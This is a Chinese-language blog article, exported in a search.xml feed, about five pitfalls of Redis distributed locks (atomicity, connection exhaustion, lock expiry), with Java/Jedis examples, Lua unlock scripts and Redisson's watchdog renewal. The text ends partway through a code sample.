<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      
        <title>redis 锁的5个大坑，如何规避？</title>
      
      <link href="/2025/02/24/redis-%E9%94%81%E7%9A%845%E4%B8%AA%E5%A4%A7%E5%9D%91%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%EF%BC%9F/"/>
      <url>/2025/02/24/redis-%E9%94%81%E7%9A%845%E4%B8%AA%E5%A4%A7%E5%9D%91%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="redis-锁的5个大坑，如何规避？"><a href="#redis-锁的5个大坑，如何规避？" class="headerlink" title="redis 锁的5个大坑，如何规避？"></a>redis 锁的5个大坑，如何规避？</h1><h2 id="分布式锁-使用场景和主要类型"><a href="#分布式锁-使用场景和主要类型" class="headerlink" title="分布式锁 使用场景和主要类型"></a>分布式锁 使用场景和主要类型</h2><h3 id="分布式锁-的使用场景"><a href="#分布式锁-的使用场景" class="headerlink" title="分布式锁 的使用场景"></a>分布式锁 的使用场景</h3><p>Redis 分布式锁在多种场景下都非常有用，特别是在需要确保分布式系统中不同进程或线程对共享资源进行互斥访问的情况下。以下是一些常见的使用场景：</p><ol><li><p><strong>秒杀抢购或优惠券领取</strong>：在电商平台中，当进行秒杀或领取优惠券时，需要确保同一时间只有一个用户能够成功操作，以避免超卖或重复领取的问题。</p></li><li><p><strong>订单处理</strong>：在分布式部署的电商系统中，用户下单前需要获取分布式锁，检查库存，确保库存足够后才允许下单，然后释放锁。</p></li><li><p><strong>实时统计</strong>：在需要统计在线用户数、PV、UV等实时数据时，可以使用分布式锁来避免并发冲突，确保数据的一致性。</p></li><li><p><strong>任务调度</strong>：在分布式系统中，如果需要执行任务调度，并且任务之间需要互斥执行，可以使用分布式锁来保证同一时间只有一个任务在运行。</p></li><li><p><strong>分布式爬虫</strong>：对于需要对同一网站进行抓取的分布式爬虫系统，可以使用分布式锁来避免多个爬虫同时抓取同一资源，导致IP被封或资源过载。</p></li><li><p><strong>消息队列幂等性</strong>：在使用 消息队列时，分布式锁可以用于确保消息不会被重复处理, 实现 幂等性。</p></li></ol><h4 id="先看本地锁："><a href="#先看本地锁：" class="headerlink" title="先看本地锁："></a>先看本地锁：</h4><p>在单体的应用开发场景中，在多线程的环境下，涉及并发同步的时候，为了保证一个代码块在同一时间只能由一个线程访问， 一般可以使用synchronized语法和ReetrantLock去保证，这实际上是本地锁的方式。</p><p>也就是说，在同一个JVM内部，大家往往采用synchronized或者Lock的方式来解决多线程间的安全问题。但在分布式集群工作的开发场景中，在JVM之间，那么就需要一种更加高级的锁机制，来处理种跨JVM进程之间的线程安全问题.</p><h4 id="再看分布式锁"><a href="#再看分布式锁" class="headerlink" title="再看分布式锁"></a>再看分布式锁</h4><p>总之， 分布式场景， 可以使用分布式锁，它是控制分布式系统之间<strong>互斥访问共享资源</strong>的一种方式。</p><p>比如说在一个分布式系统中，多台机器上部署了多个服务，当客户端一个用户发起一个数据插入请求时，如果没有分布式锁机制保证，那么那多台机器上的多个服务可能进行并发插入操作，导致数据重复插入，对于某些不允许有多余数据的业务来说，这就会造成问题。而分布式锁机制就是为了解决类似这类问题，保证多个服务之间互斥的访问共享资源，如果一个服务抢占了分布式锁，其他服务没获取到锁，就不进行后续操作。</p><p>大致意思如下图所示（不一定准确）：</p><p><img src="/./2025/02/24/redis-%E9%94%81%E7%9A%845%E4%B8%AA%E5%A4%A7%E5%9D%91%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%EF%BC%9F/1.png"></p><h3 id="什么是分布式锁？"><a href="#什么是分布式锁？" class="headerlink" title="什么是分布式锁？"></a>什么是分布式锁？</h3><p><strong>何为分布式锁？</strong></p><ul><li><p>当在分布式模型下，数据只有一份（或有限制），此时需要利用锁的技术控制某一时刻修改数据的进程数。</p></li><li><p>用一个状态值表示锁，对锁的占用和释放通过状态值来标识。</p></li></ul><p><strong>分布式锁的条件：</strong></p><ul><li><p>互斥性。在任意时刻，只有一个客户端能持有锁。</p></li><li><p>不会发生死锁。即使有一个客户端在持有锁的期间崩溃而没有主动解锁，也能保证后续其他客户端能加锁。</p></li><li><p>具有容错性。只要大部分的 Redis 节点正常运行，客户端就可以加锁和解锁。</p></li><li><p>解铃还须系铃人。加锁和解锁必须是同一个客户端，客户端自己不能把别人加的锁给解了。</p></li></ul><p><strong>分布式锁的实现：</strong></p><p>分布式锁的实现由很多种，文件锁、数据库、redis等等，比较多；分布式锁常见的多种实现方式：</p><ol><li><p>数据库悲观锁、</p></li><li><p>数据库乐观锁；</p></li><li><p>基于Redis的分布式锁；</p></li><li><p>基于ZooKeeper的分布式锁。</p></li></ol><p>在实践中，还是redis做分布式锁性能会高一些</p><h3 id="常见分布式锁方案对比"><a href="#常见分布式锁方案对比" class="headerlink" title="常见分布式锁方案对比"></a>常见分布式锁方案对比</h3><table><thead><tr><th>分类</th><th>方案</th><th>实现原理</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>基于数据库</td><td>基于mysql 表唯一索引</td><td>1.表增加唯一索引 2.加锁：执行insert语句，若报错，则表明加锁失败 3.解锁：执行delete语句</td><td>完全利用DB现有能力，实现简单</td><td>1.锁无超时自动失效机制，有死锁风险 2.不支持锁重入，不支持阻塞等待 3.操作数据库开销大，性能不高</td></tr><tr><td>基于MongoDB findAndModify原子操作</td><td>1.加锁：执行findAndModify原子命令查找document，若不存在则新增 2.解锁：删除document</td><td>实现也很容易，较基于MySQL唯一索引的方案，性能要好很多</td><td>1.大部分公司数据库用MySQL，可能缺乏相应的MongoDB运维、开发人员 2.锁无超时自动失效机制</td><td></td></tr><tr><td>基于分布式协调系统</td><td>基于ZooKeeper</td><td>1.加锁：在&#x2F;lock目录下创建临时有序节点，判断创建的节点序号是否最小。若是，则表示获取到锁；否，则则watch &#x2F;lock目录下序号比自身小的前一个节点 2.解锁：删除节点</td><td>1.由zk保障系统高可用 2.Curator框架已原生支持系列分布式锁命令，使用简单</td><td>需单独维护一套zk集群，维保成本高</td></tr><tr><td>基于redis 命令的分布式锁</td><td>基于redis命令</td><td>1. 加锁：执行setnx，若成功再执行expire添加过期时间 2. 解锁：执行delete命令</td><td>实现简单，相比数据库和分布式系统的实现，该方案最轻，性能最好</td><td>1.setnx和expire分2步执行，非原子操作；若setnx执行成功，但expire执行失败，就可能出现死锁 2.delete命令存在误删除非当前线程持有的锁的可能 3.不支持阻塞等待、不可重入</td></tr><tr><td>基于redis Lua脚本能力（Redission分布式锁）</td><td>1. 加锁：执行SET lock_name random_value EX seconds NX 命令 2. 解锁：执行Lua脚本，释放锁时验证random_value – ARGV[1]为random_value, KEYS[1]为lock_nameif redis.call(“get”, KEYS[1]) &#x3D;&#x3D; ARGV[1] then return redis.call(“del”,KEYS[1])else return 0end</td><td>同上；实现逻辑上也更严谨，除了单点问题，生产环境采用用这种方案，问题也不大。</td><td>不支持锁重入，不支持阻塞等待</td><td></td></tr></tbody></table><p>实际上，大家业务场景中，用的还是 redis 锁。</p><p>在用redis 锁的过程中， 遇到过 的 5大深坑，大家看看， 你遇到 了吗？</p><h2 id="redis-分布式锁-5大深坑"><a href="#redis-分布式锁-5大深坑" class="headerlink" title="redis 分布式锁 5大深坑"></a>redis 分布式锁 5大深坑</h2><p>曾经，做O2O电商引流业务，要频繁的对商品库存进行扣减，为避免并发造成库存 超买超卖 等问题，采用 <code>redis</code> 分布式锁加以控制。</p><p>一路踩坑 ， 惨不忍睹 ， 经验深刻</p><h2 id="之一：-原子性-之深坑"><a href="#之一：-原子性-之深坑" class="headerlink" title="之一： 原子性 之深坑"></a>之一： 原子性 之深坑</h2><p>使用redis的分布式锁，最早的版本，用的是<code>setNx</code>命令。</p><p><code>SETNX</code>（SET if Not eXists）命令用于设置一个键值对，但只有在键不存在的情况下。</p><p>因为它涉及到两个步骤：检查键是否存在和设置键。</p><p>如果多个进程或线程同时检查键是否存在，并且都发现键不存在，那么它们都可能会认为自己获得了锁。</p><p>以下是使用<code>SETNX</code>和Jedis实现一个非原子性Redis分布式锁的基本步骤：</p><ol><li><p><strong>尝试获取锁</strong>： 使用<code>SETNX</code>命令尝试设置锁。如果返回值是1，表示获取锁成功；如果返回值是0，表示锁已经被其他进程或线程获取。</p></li><li><p><strong>设置过期时间</strong>： 为了确保锁最终会被释放，即使获取锁的进程或线程崩溃，也需要为锁设置一个过期时间。</p></li><li><p><strong>执行业务逻辑</strong>： 在获取锁之后，执行需要同步的业务逻辑。</p></li><li><p><strong>释放锁</strong>： 完成业务逻辑后，使用<code>DEL</code>命令删除锁。</p></li></ol><p>以下是最早的版本，用的是<code>setNx</code> 分布式锁的示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">import redis.clients.jedis.Jedis;  </span><br><span class="line">  </span><br><span class="line">public class RedisDistributedLock &#123;  </span><br><span class="line">    private static final String LOCK\_SUCCESS = &quot;OK&quot;;  </span><br><span class="line">    private Jedis jedis = null;  </span><br><span class="line">    private String lockKey;  </span><br><span class="line">    private String lockValue = UUID.randomUUID().toString();  </span><br><span class="line">  </span><br><span class="line">    public RedisDistributedLock(Jedis jedis, String lockKey) &#123;  </span><br><span class="line">        this.jedis = jedis;  </span><br><span class="line">        this.lockKey = lockKey;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public boolean tryLock(int expireTime) &#123;  </span><br><span class="line">        // 尝试获取锁  </span><br><span class="line">        String result = jedis.setnx(lockKey, lockValue);  </span><br><span class="line">        if (LOCK\_SUCCESS.equals(result)) &#123;  </span><br><span class="line">            // 设置过期时间  </span><br><span class="line">            jedis.expire(lockKey, expireTime);  </span><br><span class="line">            return true;  </span><br><span class="line">        &#125;  </span><br><span class="line">        return false;  </span><br><span class="line">    &#125;  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 释放锁  </span><br><span class="line">     \*/  </span><br><span class="line">    public void unlock() &#123;  </span><br><span class="line">        // 检查锁是否由当前进程或线程持有  </span><br><span class="line">        if (lockValue.equals(jedis.get(lockKey))) &#123;  </span><br><span class="line">            // 删除锁  </span><br><span class="line">            jedis.del(lockKey);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">     </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>早期忽略了上面的原子性， 导致 有的场景， 加了锁没啥用。</strong></p><p>为什么呢？</p><ul><li><p>上述代码中的 <code>lock</code>方法并不是原子性的，因为它涉及到两个步骤： 因为它涉及到<code>SETNX</code>和<code>EXPIRE</code>两个命令。</p></li><li><p>上述代码中的<code>unlock</code>方法并不是原子性的，因为它涉及到两个步骤：获取锁的值和删除锁。</p></li></ul><p>如何解决 lock`方法的原子性问题？答案是:</p><ul><li><p>可以使用带<code>NX</code>和<code>EX</code>选项版本的 SET`命令</p></li><li><p>或者使用lua脚本。</p></li></ul><p>如何解决 unlock方法的原子性问题？答案是:</p><ul><li>使用lua脚本。</li></ul><p>其实 Redisson等分布式锁框架，就是使用 lua脚本实现。</p><p>不过，我们有的时候 不一定使用分布式锁框架，就像早期的版本一样， 喜欢自己造轮子。</p><p>下面，就是的第二个版本， 具备了 加锁和解锁 原子性的版本。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">package com.crazymaker.springcloud.standard.lock;  </span><br><span class="line">  </span><br><span class="line">@Slf4j  </span><br><span class="line">@Data  </span><br><span class="line">@AllArgsConstructor  </span><br><span class="line">public class JedisLock &#123;  </span><br><span class="line">  </span><br><span class="line">    private  RedisTemplate redisTemplate;  </span><br><span class="line">  </span><br><span class="line">    private static final String LOCK\_SUCCESS = &quot;OK&quot;;  </span><br><span class="line">    private static final String SET\_IF\_NOT\_EXIST = &quot;NX&quot;;  </span><br><span class="line">    private static final String SET\_WITH\_EXPIRE\_TIME = &quot;PX&quot;;  </span><br><span class="line">  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 尝试获取分布式锁  </span><br><span class="line">     \* @param jedis Redis客户端  </span><br><span class="line">     \* @param lockKey 锁  </span><br><span class="line">     \* @param requestId 请求标识  </span><br><span class="line">     \* @param expireTime 超期时间  </span><br><span class="line">     \* @return 是否获取成功  </span><br><span class="line">     \*/  </span><br><span class="line">    public static   boolean tryLock(Jedis jedis, String lockKey, String requestId, int expireTime) &#123;  </span><br><span class="line">  </span><br><span class="line">        String result = jedis.set(lockKey, requestId, SET\_IF\_NOT\_EXIST, SET\_WITH\_EXPIRE\_TIME, expireTime);  </span><br><span class="line">  </span><br><span class="line">        if (LOCK\_SUCCESS.equals(result)) &#123;  </span><br><span class="line">            return true;  </span><br><span class="line">        &#125;  </span><br><span class="line">        return false;  </span><br><span class="line">    &#125;  </span><br><span class="line">        </span><br><span class="line">       public void unlock(Jedis jedis, String lockKey,  String requestId) &#123;  </span><br><span class="line">        // 释放锁的逻辑需要确保原子性，这里只是一个简单示例  </span><br><span class="line">        // 实际上，这里应该使用Lua脚本来确保删除操作的原子性  </span><br><span class="line">        String script =  </span><br><span class="line">                &quot;if redis.call(&#x27;get&#x27;, KEYS\[1\]) == ARGV\[1\] then &quot; +  </span><br><span class="line">                &quot;return redis.call(&#x27;del&#x27;, KEYS\[1\]) &quot; +  </span><br><span class="line">                &quot;else &quot; +  </span><br><span class="line">                &quot;return 0 &quot; +  </span><br><span class="line">                &quot;end&quot;;  </span><br><span class="line">        jedis.eval(script, 1, lockKey, requestId);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>上面的加锁原子性，是通过使用带</strong><strong><code>NX</code>和<code>EX</code>选项版本的 SET 命令解决。</strong></p><p><strong>上面的解锁原子性，是通过lua脚本解决。</strong></p><p>特别说说， <code>Jedis.set</code> 方法是 Jedis 客户端用来设置 Redis 中的键值对的方法，基本对应到 redis 的set命令， 版本有很多。</p><p>Jedis.set个方法有多个重载版本，以不同的方式设置键值对，例如设置键的过期时间等。</p><p>以下是 <code>Jedis.set</code> 方法的一些常见使用方式：</p><ol><li><p><code>String set(String key, String value)</code>：将键值对设置到 Redis 中，如果键已经存在，则覆盖之前的值。返回 “OK” 表示操作成功。</p></li><li><p><code>String set(String key, String value, String nxxx)</code>：</p><p>这个版本允许 指定一个条件，<code>nxxx</code> 可以是 <code>NX</code>（Not Exist）或 <code>XX</code>（eXist），分别表示只有当键不存在或已经存在时才设置值。</p></li><li><p><code>String set(String key, String value, String nxxx, String expx, int time)</code>：</p><p>这个版本允许 设置键的过期时间，<code>expx</code> 可以是 <code>EX</code>（秒）或 <code>PX</code>（毫秒），<code>time</code> 是过期时间的值。</p></li></ol><p>在源码层面，<code>Jedis.set</code> 方法的实现会将相应的命令发送到 Redis 服务器。例如，不带过期时间的 <code>set</code> 操作会发送 <code>SET</code> 命令，而带有过期时间的 <code>set</code> 操作会发送 <code>SET</code> 命令加上 <code>EX</code> 或 <code>PX</code> 选项。</p><p>上面最后的 <code>set</code>命令，是一个原子性的版本， 该命令可以指定多个参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">String result = jedis.set(lockKey, requestId, &quot;NX&quot;, &quot;PX&quot;, expireTime);  </span><br><span class="line">if (&quot;OK&quot;.equals(result))   </span><br><span class="line">&#123;     </span><br><span class="line">    return true;  </span><br><span class="line">&#125;  </span><br><span class="line">return false;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中的参数介绍如下：</p><ul><li><p><code>lockKey</code>：锁的标识</p></li><li><p><code>requestId</code>：请求id</p></li><li><p><code>NX</code>：只在键不存在时，才对键进行设置操作。</p></li><li><p><code>PX</code>：设置键的过期时间为 millisecond 毫秒。</p></li><li><p><code>expireTime</code>：过期时间</p></li></ul><p>这个 <code>set</code>命令是原子操作，加锁和设置超时时间，一个命令就能轻松搞定。</p><p>一看源码，就能发现，其实  <code>Jedis.set</code> 方法的不同参数，可以对应到 Redis 的SET命令的命令选项。</p><p>Redis 的 <code>SET</code> 命令用于将给定的键（key）与值（value）关联。Redis 的<code>SET</code> 命令的基本格式和命令选项如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此外，<code>SET</code> 命令还支持一些选项，以提供更多的控制功能，例如设置键的过期时间、仅在键不存在时设置值等。以下是 <code>SET</code> 命令的一些常用选项：</p><ol><li><p><strong>NX</strong>：仅当键不存在时，才对键进行设置操作。相当于 “SET if Not eXists”。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value NX  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>XX</strong>：仅当键已经存在时，才对键进行设置操作。相当于 “SET if eXists”。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value XX  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>EX</strong>：设置键的过期时间，单位为秒。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value EX seconds  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>PX</strong>：设置键的过期时间，单位为毫秒。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value PX milliseconds  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>EXAT</strong>：设置键的过期时间，精确到某个时间点（Unix时间戳）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value EXAT timestamp  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>PXAT</strong>：设置键的过期时间，精确到某个时间点（Unix时间戳），单位为毫秒。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value PXAT milliseconds-timestamp  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>KEEPTTL</strong>：设置键的值，但保持键的原始过期时间不变。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value KEEPTTL  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>GET</strong>：设置键的值，并返回旧的值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value GET  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>这些选项可以组合使用。</p><p>例如， 想设置一个键的值，并设置其过期时间为10秒，同时仅当键不存在时才进行设置，你可以使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SET key value NX EX 10  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>SET</code> 命令返回的结果通常是 “OK”，表示操作成功。如果使用了 <code>GET</code> 选项，<code>SET</code> 命令将返回旧的值。</p><p>在实际应用中，这些选项使得 <code>SET</code> 命令非常灵活，可以用于实现各种复杂的逻辑，如分布式锁、缓存控制等场景。</p><h2 id="之二：连接耗尽-之深坑"><a href="#之二：连接耗尽-之深坑" class="headerlink" title="之二：连接耗尽 之深坑"></a>之二：连接耗尽 之深坑</h2><p>早期的版本， 没有正确的被释放， 大致如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">public class LockDemo &#123;  </span><br><span class="line">    public static void main(String\[\] args) &#123;  </span><br><span class="line">        JedisPool jedisPool = new JedisPool(&quot;localhost&quot;, 6379);  </span><br><span class="line">        JedisLock lock = new JedisLock(jedisPool, &quot;myLock&quot;);  </span><br><span class="line">  </span><br><span class="line">       if (lock.tryLock(10)) &#123; // 尝试获取锁，锁的过期时间为10秒  </span><br><span class="line">                </span><br><span class="line">             // 执行业务逻辑  </span><br><span class="line">              System.out.println(&quot;Lock acquired, executing business logic&quot;);  </span><br><span class="line">                   </span><br><span class="line">             lock.unlock(); // 执行完业务，释放锁  </span><br><span class="line">             System.out.println(&quot;Lock released&quot;);  </span><br><span class="line">               </span><br><span class="line">         &#125; else &#123;  </span><br><span class="line">              System.out.println(&quot;Failed to acquire lock&quot;);  </span><br><span class="line">         &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上边代码中，如果业务代码异常，或者JVM在执行业务代码的时候重启，就会导致 未及时释放锁，导致其它线程会一直尝试获取锁阻塞，</p><p>导致连接耗尽：用<code>Jedis</code>客户端会报如下的错误信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">redis.clients.jedis.exceptions.JedisConnectionException: Could not get a resource from the pool  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>redis线程池 已经没有空闲线程来处理客户端命令。</p><p>要解决这个问题，就需要及时的释放锁，并且过期的时间，不能设置太长。</p><p>改进的版本如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">public class LockDemo &#123;  </span><br><span class="line">    public static void main(String\[\] args) &#123;  </span><br><span class="line">        JedisPool jedisPool = new JedisPool(&quot;localhost&quot;, 6379);  </span><br><span class="line">        JedisLock lock = new JedisLock(jedisPool, &quot;myLock&quot;);  </span><br><span class="line">  </span><br><span class="line">        try &#123;  </span><br><span class="line">            if (lock.tryLock(10)) &#123; // 尝试获取锁，锁的过期时间为10秒  </span><br><span class="line">                try &#123;  </span><br><span class="line">                    // 执行业务逻辑  </span><br><span class="line">                    System.out.println(&quot;Lock acquired, executing business logic&quot;);  </span><br><span class="line">                    Thread.sleep(5000); // 模拟业务逻辑执行时间  </span><br><span class="line">                &#125; finally &#123;  </span><br><span class="line">                    lock.unlock(); // 释放锁  </span><br><span class="line">                    System.out.println(&quot;Lock released&quot;);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125; else &#123;  </span><br><span class="line">                System.out.println(&quot;Failed to acquire lock&quot;);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; finally &#123;  </span><br><span class="line">            jedisPool.close();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><p><strong>锁的过期时间</strong>：在 <code>tryLock</code> 方法中设置了锁的过期时间，这是为了防止持有锁的进程崩溃，从而导致锁永远无法释放。但是也不能太长，设置在 30s内为适宜。</p></li><li><p><strong>锁的安全性</strong>：在 <code>unlock</code> 方法中，我们使用 Lua 脚本来确保检查和删除操作的原子性，这是为了防止错误地释放其他进程持有的锁。</p></li><li><p><strong>连接池资源管理</strong>：在示例中，关闭了连接，确保 Jedis 连接在使用后被正确关闭，避免资源泄露。</p></li></ul><p>所以，加锁后，如果不及时释放锁，会有很多问题。</p><p>分布式锁更合理的用法是：</p><ol><li><p>手动加锁</p></li><li><p>业务操作</p></li><li><p>手动释放锁</p></li><li><p>如果手动释放锁失败了，则达到超时时间，redis会自动释放锁。</p></li></ol><p>大致流程图如下：</p><p><img src="/./2025/02/24/redis-%E9%94%81%E7%9A%845%E4%B8%AA%E5%A4%A7%E5%9D%91%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%EF%BC%9F/2.png"></p><h2 id="之三：锁过期-的深坑"><a href="#之三：锁过期-的深坑" class="headerlink" title="之三：锁过期 的深坑"></a>之三：锁过期 的深坑</h2><p>下面有一个简单的使用锁， 实现并发操作文件的例子，锁的时间 10秒：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">  //写数据到文件  </span><br><span class="line">function writeData(filename, data) &#123;  </span><br><span class="line">    boolean locked = lock.tryLock(10, TimeUnit.SECONDS);  </span><br><span class="line">    if (!locked) &#123;  </span><br><span class="line">        throw &#x27;Failed to acquire lock&#x27;;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    try &#123;  </span><br><span class="line">        //将数据写到文件  </span><br><span class="line">        var file = storage.readFile(filename);  </span><br><span class="line">        var updated = updateContents(file, data);  </span><br><span class="line">        storage.writeFile(filename, updated);  </span><br><span class="line">    &#125; finally &#123;  </span><br><span class="line">        lock.unlock();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>问题是：</p><ul><li><p>如果在写文件过程中，发生了 fullGC，并且其时间跨度较长， 超过了10秒，</p></li><li><p>那么，由于锁的有效期就是 10s，这时候任务没有执行完成，分布式锁就自动过期了。</p></li></ul><p>在此过程中，client2 抢到锁，写了文件。</p><p>回到 client1： client1 的fullGC完成后，也继续写文件，<strong>注意，此时client1 的并没有占用锁</strong>，此时写入会导致文件数据错乱，发生线程安全问题。</p><p>fullGC STW导致，导致了的锁过期问题。 整个流程，打造具体如下图所示：</p><p><img src="/./2025/02/24/redis-%E9%94%81%E7%9A%845%E4%B8%AA%E5%A4%A7%E5%9D%91%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%EF%BC%9F/3.png"></p><h3 id="锁过期问题-的解决方案"><a href="#锁过期问题-的解决方案" class="headerlink" title="锁过期问题 的解决方案"></a>锁过期问题 的解决方案</h3><p>锁过期问题,大概的解决方案 有2种：</p><p>1： 模拟CAS乐观锁的方式，增加版本号</p><p>2：<strong>watch dog自动延期机制</strong></p><h3 id="方式一：模拟CAS乐观锁的方式，增加版本号"><a href="#方式一：模拟CAS乐观锁的方式，增加版本号" class="headerlink" title="方式一：模拟CAS乐观锁的方式，增加版本号"></a>方式一：模拟CAS乐观锁的方式，增加版本号</h3><p><strong>1： 模拟CAS乐观锁的方式，增加版本号（如下图中的token）</strong></p><p>CAS乐观锁 的方法也很简单：</p><p>在每次写操作时加入一个 token。 token 可以是一个递增的数字（lock service 可以做到），每次有 client 申请锁就递增一次。比如：</p><ul><li><p>client1 的token 是33</p></li><li><p>client2 的token 是34</p></li></ul><p>紧接着 client1 活过来之后尝试写入数据，自身 token 33 比 34 小，因此client1 的写入操作被拒绝了。</p><p><img src="/./2025/02/24/redis-%E9%94%81%E7%9A%845%E4%B8%AA%E5%A4%A7%E5%9D%91%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%EF%BC%9F/4.png"></p><p>此方案如果要实现，需要调整业务逻辑与之配合，所以会入侵代码。</p><h3 id="方式二：watch-dog自动延期机制"><a href="#方式二：watch-dog自动延期机制" class="headerlink" title="方式二：watch dog自动延期机制"></a>方式二：watch dog自动延期机制</h3><p>客户端1加锁的锁key默认生存时间才30秒，如果超过了30秒，客户端1还想一直持有这把锁，怎么办呢？</p><p>简单！</p><p>只要客户端1一旦加锁成功，就会启动一个watch dog看门狗，<strong>他是一个后台线程，会每隔10秒检查一下</strong>，如果客户端1还持有锁key，那么就会不断的延长锁key的生存时间。</p><blockquote><p>redission，采用的就是这种方案， 此方案不会入侵业务代码。</p></blockquote><p>watch dog看门狗 的作用是在锁没有过期之前，不断的延长锁的有效期。</p><p>默认情况下，锁的过期时间是 30 秒，看门狗的续期时间是 10 秒，</p><p>也可以通过修改 Config.lockWatchdogTimeout 来指定。</p><p>Redission 就是 使用 看门狗的机制。建议大家不用自己实现，直接使用Redission。</p><p><strong>当然，作为高级开发或者架构师， 锁过期的 原理还是要懂的。</strong></p><p><code>redisson</code>的解决锁过期的源码，大致如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">@Slf4j  </span><br><span class="line">@Service  </span><br><span class="line">public class RedisDistributionLockPlus &#123;  </span><br><span class="line">   </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 加锁超时时间，单位毫秒， 即：加锁时间内执行完操作，如果未完成会有并发现象  </span><br><span class="line">     \*/  </span><br><span class="line">    private static final long DEFAULT\_LOCK\_TIMEOUT = 30;  </span><br><span class="line">   </span><br><span class="line">    private static final long TIME\_SECONDS\_FIVE = 5 ;  </span><br><span class="line">   </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 每个key的过期时间 &#123;@link LockContent&#125;  </span><br><span class="line">     \*/  </span><br><span class="line">    private Map&lt;String, LockContent&gt; lockContentMap = new ConcurrentHashMap&lt;&gt;(512);  </span><br><span class="line">   </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* redis执行成功的返回  </span><br><span class="line">     \*/  </span><br><span class="line">    private static final Long EXEC\_SUCCESS = 1L;  </span><br><span class="line">   </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 获取锁lua脚本， k1：获锁key, 